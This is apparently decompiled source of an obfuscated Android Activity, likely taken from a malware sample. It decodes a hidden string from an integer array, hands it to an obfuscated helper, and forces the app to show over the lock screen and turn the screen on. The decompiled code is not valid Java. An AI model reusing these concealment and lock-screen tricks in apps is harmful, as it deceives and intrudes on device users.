package tev.piqgahor;
public class ctTZ3rUj extends android.app.Activity {

    public ctTZ3rUj()
    {
        return;
    }

    private void IfMMSz2437()
    {
        android.view.Window v0 = this.getWindow();
        v0.addFlags(1152);
        if (android.os.Build$VERSION.SDK_INT < 27) {
            v0.addFlags(6815744);
        } else {
            this.setTurnScreenOn(1);
            this.setShowWhenLocked(1);
        }
        return;
    }

    protected void onCreate(android.os.Bundle p2)
    {
        super.onCreate(p2);
        String v0_1 = new int[26];
        v0_1 = {48, 139, 131, 147, 162, 149, 149, 158, 127, 158, 113, 147, 164, 153, 166, 153, 164, 169, 141, 80, 115, 162, 149, 145, 164, 149};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        this.IfMMSz2437();
        return;
    }

    public void onResume()
    {
        super.onResume();
        new android.os.Handler().postDelayed(new tev.piqgahor.ctTZ3rUj$1(this), 1000);
        return;
    }
}
